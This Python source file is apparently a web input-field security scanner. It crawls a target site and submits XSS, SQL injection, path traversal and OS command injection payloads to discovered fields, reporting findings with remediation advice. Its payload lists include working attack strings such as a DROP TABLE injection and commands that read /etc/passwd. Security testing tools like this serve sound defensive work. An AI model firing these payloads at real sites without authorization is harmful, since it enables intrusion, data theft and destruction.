#!/usr/bin/env python3
"""
Input Field Security Tester - XSS, SQLi, Path Traversal, Command Injection
Crawls target to discover input fields and tests each for injection vulnerabilities.
"""

import asyncio
import argparse
import json
import logging
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from html.parser import HTMLParser
from pathlib import Path
from typing import Optional

try:
    import aiohttp
    from tqdm import tqdm
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Run: pip install -r requirements.txt")
    sys.exit(1)


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("input_tester")


# ---------------------------------------------------------------------------
# Constants & Payloads
# ---------------------------------------------------------------------------

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "';alert(1)//",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "<a href=javascript:alert(1)>click</a>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<svg><script>alert(1)</script></svg>",
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    "';alert(String.fromCharCode(88,83,83))//",
    "{{7*7}}${7*7}<%= 7*7 %>",
    "{{constructor.constructor('alert(1')()}}",
]

DOM_XSS_INDICATORS = [
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "window.location",
    "location.hash",
    "location.search",
    "document.cookie",
    "document.write",
    "innerHTML",
    "outerHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "document.createElement",
]

SQLI_PAYLOADS_ERROR = [
    "'",
    "\"",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "admin'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "') OR ('1'='1",
    "1' UNION SELECT 1,2,3--",
]

SQLI_PAYLOADS_BLIND = [
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1' AND SUBSTRING((SELECT database()),1,1)='a'--", "1' AND SUBSTRING((SELECT database()),1,1)='z'--"),
    ("1' AND LENGTH((SELECT database()))>0--", "1' AND LENGTH((SELECT database()))>100--"),
]

SQLI_TIME_PAYLOADS = [
    ("1' AND SLEEP(3)--", 3),
    ("1'; WAITFOR DELAY '0:0:3'--", 3),
    ("1' OR pg_sleep(3)--", 3),
]

SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ORA-\d{5}",
    r"Microsoft OLE DB Provider for",
    r"ODBC SQL Server Driver",
    r"PostgreSQL.*ERROR",
    r"SQLite/JDBCDriver",
    r"SQLSTATE\[",
    r"Invalid column name",
    r"Microsoft Access Driver",
    r"JET Database Engine",
    r"mysql_fetch",
    r"sqlite3\.OperationalError",
    r"pg_query\(\).*failed",
    r"com\.mysql\.jdbc",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%5c..%5c..%5cetc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    ".../.../.../etc/passwd",
    "..\\..\\..\\etc\\passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
]

PATH_TRAVERSAL_MARKERS = [
    "root:x:0:0",
    "[boot loader]",
    "root:*:",
    "daemon:",
    "nobody:",
    "[extensions]",
]

CMD_INJECTION_PAYLOADS = [
    ";id",
    "|id",
    "$(id)",
    "`id`",
    "; whoami",
    "| whoami",
    "$(whoami)",
    "`whoami`",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
    "; sleep 3",
    "| sleep 3",
    "$(sleep 3)",
    "; ping -c 3 127.0.0.1",
    "| ping -c 3 127.0.0.1",
]

CMD_INJECTION_MARKERS = [
    r"uid=\d+",
    r"root:",
    r"windows",
    r"\d+ packets transmitted",
    r"bytes from",
    r"ping statistics",
]


# ---------------------------------------------------------------------------
# Data Classes
# ---------------------------------------------------------------------------

class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class Finding:
    vuln_type: str
    severity: str
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    request_method: str = ""
    response_code: int = 0
    response_time: float = 0.0
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        d = asdict(self)
        return {k: v for k, v in d.items() if v}


@dataclass
class InputField:
    url: str
    name: str
    field_type: str  # text, password, textarea, select, hidden, url, email, number
    method: str
    action: str
    value: str = ""


@dataclass
class TestResults:
    target: str
    timestamp: str
    fields_scanned: int = 0
    findings: list = field(default_factory=list)
    tests_run: dict = field(default_factory=dict)
    duration_seconds: float = 0.0
    errors: list = field(default_factory=list)

    def to_dict(self) -> dict:
        counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        for f in self.findings:
            sev = f.severity if hasattr(f, "severity") else f.get("severity", "info")
            if sev in counts:
                counts[sev] += 1
        return {
            "target": self.target,
            "timestamp": self.timestamp,
            "fields_scanned": self.fields_scanned,
            "findings": [f.to_dict() if hasattr(f, "to_dict") else f for f in self.findings],
            "summary": {
                "total_findings": len(self.findings),
                **counts,
                "tests_run": self.tests_run,
                "duration_seconds": self.duration_seconds,
                "errors": len(self.errors),
            },
        }


# ---------------------------------------------------------------------------
# Progress Bar
# ---------------------------------------------------------------------------

class ProgressBar:
    def __init__(self, total: int, desc: str):
        self.total = total
        self.current = 0
        self.desc = desc
        self.start_time = time.time()
        self.tqdm = tqdm(total=total, desc=desc, unit="item", ncols=80)

    def update(self, n: int = 1):
        self.current += n
        self.tqdm.update(n)

    def finish(self):
        self.tqdm.close()
        elapsed = time.time() - self.start_time
        logger.info(f"{self.desc} completed in {elapsed:.1f}s")


# ---------------------------------------------------------------------------
# Crawler & Input Field Discovery
# ---------------------------------------------------------------------------

class InputFieldDiscovery:
    """Crawl target and discover all input fields."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)
        self._visited: set[str] = set()

    def _is_same_domain(self, url: str, base_url: str) -> bool:
        try:
            url_parsed = urllib.parse.urlparse(url)
            base_parsed = urllib.parse.urlparse(base_url)
            return url_parsed.netloc == base_parsed.netloc
        except Exception:
            return False

    async def _fetch(self, url: str) -> Optional[str]:
        async with self._semaphore:
            try:
                async with self.session.get(
                    url, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True
                ) as resp:
                    if resp.status == 200:
                        content_type = resp.headers.get("Content-Type", "")
                        if "text/html" in content_type:
                            return await resp.text(errors="ignore")
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass
        return None

    def _extract_links(self, html: str, base_url: str) -> list[str]:
        links = []
        pattern = re.compile(r'href=["\']([^"\'#]+)["\']', re.IGNORECASE)
        for match in pattern.finditer(html):
            link = match.group(1)
            if not link.startswith(("http://", "https://", "data:", "javascript:", "mailto:")):
                link = urllib.parse.urljoin(base_url, link)
            if self._is_same_domain(link, base_url):
                links.append(link.split("#")[0].split("?")[0])
        return links

    def _extract_fields_from_html(self, html: str, url: str) -> list[InputField]:
        fields = []

        class InputParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self._current_form_action = url
                self._current_form_method = "get"
                self._in_form = False
                self._tag_stack = []

            def handle_starttag(self, tag, attrs):
                attr_dict = {k.lower(): (v or "") for k, v in attrs}
                self._tag_stack.append(tag)

                if tag == "form":
                    self._in_form = True
                    action = attr_dict.get("action", url)
                    if action and not action.startswith(("http://", "https://", "data:")):
                        action = urllib.parse.urljoin(url, action)
                    self._current_form_action = action
                    self._current_form_method = attr_dict.get("method", "get").lower()

                elif self._in_form:
                    name = attr_dict.get("name", "")
                    if not name:
                        return

                    input_type = attr_dict.get("type", "text").lower()

                    if tag == "input":
                        if input_type not in ("submit", "button", "image", "reset"):
                            fields.append(InputField(
                                url=url, name=name, field_type=input_type,
                                method=self._current_form_method,
                                action=self._current_form_action,
                                value=attr_dict.get("value", ""),
                            ))
                    elif tag == "textarea":
                        fields.append(InputField(
                            url=url, name=name, field_type="textarea",
                            method=self._current_form_method,
                            action=self._current_form_action,
                        ))
                    elif tag == "select":
                        fields.append(InputField(
                            url=url, name=name, field_type="select",
                            method=self._current_form_method,
                            action=self._current_form_action,
                        ))

            def handle_endtag(self, tag):
                if self._tag_stack and self._tag_stack[-1] == tag:
                    self._tag_stack.pop()
                if tag == "form":
                    self._in_form = False

        parser = InputParser()
        try:
            parser.feed(html)
        except Exception:
            pass

        return fields

    def _extract_url_params(self, url: str) -> list[InputField]:
        fields = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        for name, values in params.items():
            fields.append(InputField(
                url=url, name=name, field_type="url_param",
                method="GET", action=url,
                value=values[0] if values else "",
            ))
        return fields

    async def discover(self, start_url: str, max_depth: int = 2, max_pages: int = 30) -> list[InputField]:
        """Crawl and discover all input fields."""
        all_fields = []
        parsed = urllib.parse.urlparse(start_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        queue: list[tuple[str, int]] = [(start_url, 0)]
        visited = set()

        logger.info(f"Discovering input fields from {start_url} (depth={max_depth}, max_pages={max_pages})")

        progress = ProgressBar(max_pages, "Field discovery")

        while queue and len(visited) < max_pages:
            url, depth = queue.pop(0)
            if url in visited or depth > max_depth:
                progress.update()
                continue

            visited.add(url)
            html = await self._fetch(url)
            if html is None:
                progress.update()
                continue

            self._visited.add(url)

            form_fields = self._extract_fields_from_html(html, url)
            all_fields.extend(form_fields)

            url_fields = self._extract_url_params(url)
            all_fields.extend(url_fields)

            if depth < max_depth:
                links = self._extract_links(html, url)
                for link in links:
                    if link not in visited:
                        queue.append((link, depth + 1))

            progress.update()
            await asyncio.sleep(1.0 / self._semaphore._value if hasattr(self._semaphore, '_value') else 0.1)

        progress.finish()

        unique_fields = []
        seen = set()
        for f in all_fields:
            key = (f.action, f.name, f.method)
            if key not in seen:
                seen.add(key)
                unique_fields.append(f)

        logger.info(f"Discovered {len(unique_fields)} unique input fields across {len(visited)} pages")
        return unique_fields


# ---------------------------------------------------------------------------
# XSS Tester
# ---------------------------------------------------------------------------

class XSSTester:
    """Test input fields for cross-site scripting vulnerabilities."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _submit(
        self, field: InputField, payload: str
    ) -> tuple[int, str, float]:
        async with self._semaphore:
            start = time.time()
            try:
                data = {field.name: payload}
                if field.method.lower() == "get":
                    async with self.session.get(
                        field.action, params=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
                else:
                    async with self.session.post(
                        field.action, data=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return 0, "", time.time() - start

    def _check_reflected(self, payload: str, body: str) -> bool:
        escaped_patterns = [
            re.escape(payload).replace(r"<", r"&lt;").replace(r">", r"&gt;").replace(r'"', r"&quot;"),
            re.escape(payload).replace(r"<", r"&#60;").replace(r">", r"&#62;"),
            payload.replace("<", "\\u003c").replace(">", "\\u003e"),
        ]
        for pattern in escaped_patterns:
            if pattern in body:
                return False
        return payload in body

    async def test_field(self, field: InputField) -> list[Finding]:
        findings = []

        for payload in XSS_PAYLOADS:
            status, body, resp_time = await self._submit(field, payload)
            if status == 0:
                continue

            if self._check_reflected(payload, body):
                findings.append(Finding(
                    vuln_type="Cross-Site Scripting (Reflected)",
                    severity=Severity.HIGH,
                    url=field.action,
                    parameter=field.name,
                    payload=payload,
                    evidence=f"Payload reflected in response without encoding (HTTP {status})",
                    description=f"Reflected XSS in field '{field.name}'. Input is reflected without output encoding.",
                    remediation="Implement context-aware output encoding. Use Content-Security-Policy. Validate input.",
                    request_method=field.method.upper(),
                    response_code=status,
                    response_time=resp_time,
                ))
                break

        return findings

    async def test_fields(self, fields: list[InputField]) -> list[Finding]:
        findings = []
        testable = [f for f in fields if f.field_type not in ("hidden", "submit", "button")]

        progress = ProgressBar(len(testable), "XSS testing")
        for field in testable:
            field_findings = await self.test_field(field)
            findings.extend(field_findings)
            progress.update()
        progress.finish()

        return findings


# ---------------------------------------------------------------------------
# SQL Injection Tester
# ---------------------------------------------------------------------------

class SQLInjectionTester:
    """Test input fields for SQL injection vulnerabilities."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _submit(
        self, field: InputField, payload: str
    ) -> tuple[int, str, float]:
        async with self._semaphore:
            start = time.time()
            try:
                data = {field.name: payload}
                if field.method.lower() == "get":
                    async with self.session.get(
                        field.action, params=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
                else:
                    async with self.session.post(
                        field.action, data=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return 0, "", time.time() - start

    def _check_sql_error(self, body: str) -> Optional[str]:
        body_lower = body.lower()
        for pattern in SQL_ERROR_PATTERNS:
            match = re.search(pattern, body_lower, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    async def test_error_based(self, field: InputField) -> Optional[Finding]:
        for payload in SQLI_PAYLOADS_ERROR:
            status, body, resp_time = await self._submit(field, payload)
            if status == 0:
                continue

            error = self._check_sql_error(body)
            if error:
                return Finding(
                    vuln_type="SQL Injection (Error-Based)",
                    severity=Severity.CRITICAL,
                    url=field.action,
                    parameter=field.name,
                    payload=payload,
                    evidence=f"SQL error: {error}",
                    description=f"Error-based SQL injection in field '{field.name}'. SQL errors exposed.",
                    remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
                    request_method=field.method.upper(),
                    response_code=status,
                    response_time=resp_time,
                )
        return None

    async def test_blind(self, field: InputField) -> Optional[Finding]:
        for true_payload, false_payload in SQLI_PAYLOADS_BLIND:
            _, true_body, _ = await self._submit(field, true_payload)
            _, false_body, _ = await self._submit(field, false_payload)

            if not true_body or not false_body:
                continue

            true_len = len(true_body)
            false_len = len(false_body)

            if true_len != false_len:
                return Finding(
                    vuln_type="SQL Injection (Blind - Boolean)",
                    severity=Severity.HIGH,
                    url=field.action,
                    parameter=field.name,
                    payload=f"True: {true_payload} | False: {false_payload}",
                    evidence=f"Response lengths differ: true={true_len}, false={false_len}",
                    description=f"Blind SQL injection in field '{field.name}'. Responses differ between true/false conditions.",
                    remediation="Use parameterized queries. Validate and sanitize all inputs.",
                    request_method=field.method.upper(),
                )
        return None

    async def test_time_based(self, field: InputField) -> Optional[Finding]:
        baseline_times = []
        for _ in range(2):
            _, _, t = await self._submit(field, "test_baseline")
            baseline_times.append(t)
        baseline_avg = sum(baseline_times) / len(baseline_times) if baseline_times else 1.0

        for payload, delay in SQLI_TIME_PAYLOADS:
            _, _, resp_time = await self._submit(field, payload)
            if resp_time > baseline_avg + delay + 1.0:
                return Finding(
                    vuln_type="SQL Injection (Time-Based Blind)",
                    severity=Severity.HIGH,
                    url=field.action,
                    parameter=field.name,
                    payload=payload,
                    evidence=f"Response time: {resp_time:.1f}s vs baseline {baseline_avg:.1f}s",
                    description=f"Time-based blind SQL injection in field '{field.name}'.",
                    remediation="Use parameterized queries. Implement query timeouts.",
                    request_method=field.method.upper(),
                    response_time=resp_time,
                )
        return None

    async def test_fields(self, fields: list[InputField]) -> list[Finding]:
        findings = []
        testable = [f for f in fields if f.field_type not in ("hidden", "submit", "button")]

        progress = ProgressBar(len(testable), "SQLi testing")
        for field in testable:
            finding = await self.test_error_based(field)
            if finding:
                findings.append(finding)
                progress.update()
                continue

            finding = await self.test_blind(field)
            if finding:
                findings.append(finding)
                progress.update()
                continue

            finding = await self.test_time_based(field)
            if finding:
                findings.append(finding)

            progress.update()
        progress.finish()

        return findings


# ---------------------------------------------------------------------------
# Path Traversal Tester
# ---------------------------------------------------------------------------

class PathTraversalTester:
    """Test input fields for directory/path traversal vulnerabilities."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _submit(
        self, field: InputField, payload: str
    ) -> tuple[int, str, float]:
        async with self._semaphore:
            start = time.time()
            try:
                data = {field.name: payload}
                if field.method.lower() == "get":
                    async with self.session.get(
                        field.action, params=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
                else:
                    async with self.session.post(
                        field.action, data=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return 0, "", time.time() - start

    def _check_traversal(self, body: str) -> Optional[str]:
        body_lower = body.lower()
        for marker in PATH_TRAVERSAL_MARKERS:
            if marker.lower() in body_lower:
                return marker
        return None

    async def test_fields(self, fields: list[InputField]) -> list[Finding]:
        findings = []
        testable = [f for f in fields if f.field_type not in ("hidden", "submit", "button")]

        progress = ProgressBar(len(testable), "Path traversal")
        for field in testable:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                status, body, resp_time = await self._submit(field, payload)
                if status == 0:
                    continue

                marker = self._check_traversal(body)
                if marker:
                    findings.append(Finding(
                        vuln_type="Directory/Path Traversal",
                        severity=Severity.HIGH,
                        url=field.action,
                        parameter=field.name,
                        payload=payload,
                        evidence=f"File content marker: {marker}",
                        description=f"Path traversal in field '{field.name}'. External file access possible.",
                        remediation="Validate and sanitize file paths. Use whitelists. Never use user input in file paths.",
                        request_method=field.method.upper(),
                        response_code=status,
                        response_time=resp_time,
                    ))
                    break
            progress.update()
        progress.finish()

        return findings


# ---------------------------------------------------------------------------
# Command Injection Tester
# ---------------------------------------------------------------------------

class CommandInjectionTester:
    """Test input fields for OS command injection vulnerabilities."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _submit(
        self, field: InputField, payload: str
    ) -> tuple[int, str, float]:
        async with self._semaphore:
            start = time.time()
            try:
                data = {field.name: payload}
                if field.method.lower() == "get":
                    async with self.session.get(
                        field.action, params=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
                else:
                    async with self.session.post(
                        field.action, data=data,
                        timeout=aiohttp.ClientTimeout(total=15),
                        allow_redirects=True,
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return 0, "", time.time() - start

    def _check_cmd_output(self, body: str) -> Optional[str]:
        for pattern in CMD_INJECTION_MARKERS:
            if re.search(pattern, body):
                return pattern
        return None

    async def test_fields(self, fields: list[InputField]) -> list[Finding]:
        findings = []
        testable = [f for f in fields if f.field_type not in ("hidden", "submit", "button")]

        progress = ProgressBar(len(testable), "Command injection")
        for field in testable:
            for payload in CMD_INJECTION_PAYLOADS:
                status, body, resp_time = await self._submit(field, payload)
                if status == 0:
                    continue

                marker = self._check_cmd_output(body)
                if marker:
                    findings.append(Finding(
                        vuln_type="OS Command Injection",
                        severity=Severity.CRITICAL,
                        url=field.action,
                        parameter=field.name,
                        payload=payload,
                        evidence=f"Command output pattern: {marker}",
                        description=f"Command injection in field '{field.name}'. OS commands can be executed.",
                        remediation="Avoid shell commands. Use parameterized APIs. Validate and sanitize inputs.",
                        request_method=field.method.upper(),
                        response_code=status,
                        response_time=resp_time,
                    ))
                    break
            progress.update()
        progress.finish()

        return findings


# ---------------------------------------------------------------------------
# DOM XSS Analyzer
# ---------------------------------------------------------------------------

class DOMXSSAnalyzer:
    """Analyze pages for DOM-based XSS indicators."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _fetch(self, url: str) -> Optional[str]:
        async with self._semaphore:
            try:
                async with self.session.get(
                    url, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True
                ) as resp:
                    if resp.status == 200:
                        return await resp.text(errors="ignore")
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass
        return None

    async def analyze(self, urls: list[str]) -> list[Finding]:
        findings = []

        progress = ProgressBar(len(urls), "DOM XSS analysis")
        for url in urls:
            body = await self._fetch(url)
            if not body:
                progress.update()
                continue

            body_lower = body.lower()
            found_indicators = []
            for indicator in DOM_XSS_INDICATORS:
                if indicator.lower() in body_lower:
                    found_indicators.append(indicator)

            if found_indicators:
                findings.append(Finding(
                    vuln_type="DOM-Based XSS (Indicator)",
                    severity=Severity.MEDIUM,
                    url=url,
                    evidence=f"DOM XSS indicators: {', '.join(found_indicators[:5])}",
                    description=f"Page uses dangerous DOM manipulation patterns ({len(found_indicators)} indicators).",
                    remediation="Avoid innerHTML, document.write, eval with user input. Use textContent. Implement CSP.",
                    details={"indicators": found_indicators},
                ))

            progress.update()
        progress.finish()

        return findings


# ---------------------------------------------------------------------------
# Main Orchestrator
# ---------------------------------------------------------------------------

class InputFieldTester:
    """Orchestrate all input field security tests."""

    def __init__(
        self,
        target: str,
        output: str = None,
        rate_limit: float = 5.0,
        max_depth: int = 2,
        max_pages: int = 30,
        timeout: int = 15,
        test_xss: bool = True,
        test_sqli: bool = True,
        test_traversal: bool = True,
        test_cmdi: bool = True,
        test_dom_xss: bool = True,
    ):
        self.target = target if target.startswith("http") else f"https://{target}"
        self.output = output or f"input_test_{urllib.parse.urlparse(self.target).netloc.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.rate_limit = rate_limit
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.timeout = timeout
        self.test_flags = {
            "xss": test_xss,
            "sqli": test_sqli,
            "traversal": test_traversal,
            "cmdi": test_cmdi,
            "dom_xss": test_dom_xss,
        }
        self.results = TestResults(
            target=self.target,
            timestamp=datetime.utcnow().isoformat() + "Z",
        )
        self._session: Optional[aiohttp.ClientSession] = None

    async def _create_session(self) -> aiohttp.ClientSession:
        connector = aiohttp.TCPConnector(limit=self.rate_limit, ssl=False)
        return aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={
                "User-Agent": "InputTester/1.0 (Security Testing)",
                "Accept": "text/html,application/xhtml+xml,*/*",
                "Accept-Language": "en-US,en;q=0.9",
            },
        )

    async def run(self) -> dict:
        logger.info(f"Starting input field security test for {self.target}")
        start_time = time.time()

        self._session = await self._create_session()

        try:
            # Phase 1: Discover input fields
            logger.info("=" * 60)
            logger.info("Phase 1: Input Field Discovery")
            logger.info("=" * 60)
            discovery = InputFieldDiscovery(self._session, self.rate_limit)
            fields = await discovery.discover(
                self.target,
                max_depth=self.max_depth,
                max_pages=self.max_pages,
            )
            self.results.fields_scanned = len(fields)

            if not fields:
                logger.warning("No input fields discovered. Testing URL parameters only.")

            urls = list(discovery._visited)

            # Phase 2: XSS Testing
            if self.test_flags["xss"] and fields:
                logger.info("=" * 60)
                logger.info("Phase 2: Cross-Site Scripting (XSS) Testing")
                logger.info("=" * 60)
                xss_tester = XSSTester(self._session, self.rate_limit)
                xss_findings = await xss_tester.test_fields(fields)
                self.results.findings.extend(xss_findings)
                self.results.tests_run["xss"] = len(xss_findings)

            # Phase 3: SQL Injection Testing
            if self.test_flags["sqli"] and fields:
                logger.info("=" * 60)
                logger.info("Phase 3: SQL Injection Testing")
                logger.info("=" * 60)
                sqli_tester = SQLInjectionTester(self._session, self.rate_limit)
                sqli_findings = await sqli_tester.test_fields(fields)
                self.results.findings.extend(sqli_findings)
                self.results.tests_run["sqli"] = len(sqli_findings)

            # Phase 4: Path Traversal Testing
            if self.test_flags["traversal"] and fields:
                logger.info("=" * 60)
                logger.info("Phase 4: Path Traversal Testing")
                logger.info("=" * 60)
                traversal_tester = PathTraversalTester(self._session, self.rate_limit)
                traversal_findings = await traversal_tester.test_fields(fields)
                self.results.findings.extend(traversal_findings)
                self.results.tests_run["path_traversal"] = len(traversal_findings)

            # Phase 5: Command Injection Testing
            if self.test_flags["cmdi"] and fields:
                logger.info("=" * 60)
                logger.info("Phase 5: Command Injection Testing")
                logger.info("=" * 60)
                cmdi_tester = CommandInjectionTester(self._session, self.rate_limit)
                cmdi_findings = await cmdi_tester.test_fields(fields)
                self.results.findings.extend(cmdi_findings)
                self.results.tests_run["command_injection"] = len(cmdi_findings)

            # Phase 6: DOM XSS Analysis
            if self.test_flags["dom_xss"] and urls:
                logger.info("=" * 60)
                logger.info("Phase 6: DOM-Based XSS Analysis")
                logger.info("=" * 60)
                dom_analyzer = DOMXSSAnalyzer(self._session, self.rate_limit)
                dom_findings = await dom_analyzer.analyze(urls[:20])
                self.results.findings.extend(dom_findings)
                self.results.tests_run["dom_xss"] = len(dom_findings)

        finally:
            if self._session:
                await self._session.close()

        self.results.duration_seconds = round(time.time() - start_time, 1)

        logger.info("=" * 60)
        logger.info("Input Field Security Test Complete")
        logger.info("=" * 60)
        summary = self.results.to_dict()["summary"]
        logger.info(f"Fields scanned: {self.results.fields_scanned}")
        logger.info(f"Total findings: {summary['total_findings']}")
        for sev in ["critical", "high", "medium", "low", "info"]:
            if summary.get(sev, 0) > 0:
                logger.info(f"  {sev.upper()}: {summary[sev]}")
        logger.info(f"Duration: {self.results.duration_seconds}s")

        return self.results.to_dict()

    def save(self):
        output_path = Path(self.output)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, "w") as f:
            json.dump(self.results.to_dict(), f, indent=2)
        logger.info(f"Results saved to {output_path}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Input Field Security Tester - XSS, SQLi, Path Traversal, Command Injection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s https://example.com
  %(prog)s https://example.com -d 3 -p 50
  %(prog)s https://example.com --no-sqli --rate 3
  %(prog)s https://example.com -o results.json -v
        """,
    )
    parser.add_argument("target", help="Target URL to scan (e.g., https://example.com)")
    parser.add_argument("-o", "--output", help="Output JSON file path")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Max crawl depth (default: 2)")
    parser.add_argument("-p", "--max-pages", type=int, default=30, help="Max pages to crawl (default: 30)")
    parser.add_argument("--rate", type=float, default=5.0, help="Max concurrent requests (default: 5)")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--no-xss", action="store_true", help="Skip XSS testing")
    parser.add_argument("--no-sqli", action="store_true", help="Skip SQL injection testing")
    parser.add_argument("--no-traversal", action="store_true", help="Skip path traversal testing")
    parser.add_argument("--no-cmdi", action="store_true", help="Skip command injection testing")
    parser.add_argument("--no-dom-xss", action="store_true", help="Skip DOM XSS analysis")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose/debug logging")
    parser.add_argument("--json-stdout", action="store_true", help="Print JSON results to stdout")
    return parser.parse_args()


async def main():
    args = parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    tester = InputFieldTester(
        target=args.target,
        output=args.output,
        rate_limit=args.rate,
        max_depth=args.depth,
        max_pages=args.max_pages,
        timeout=args.timeout,
        test_xss=not args.no_xss,
        test_sqli=not args.no_sqli,
        test_traversal=not args.no_traversal,
        test_cmdi=not args.no_cmdi,
        test_dom_xss=not args.no_dom_xss,
    )

    try:
        results = await tester.run()
        tester.save()

        if args.json_stdout:
            print(json.dumps(results, indent=2))

    except KeyboardInterrupt:
        logger.warning("Test interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Input test failed: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
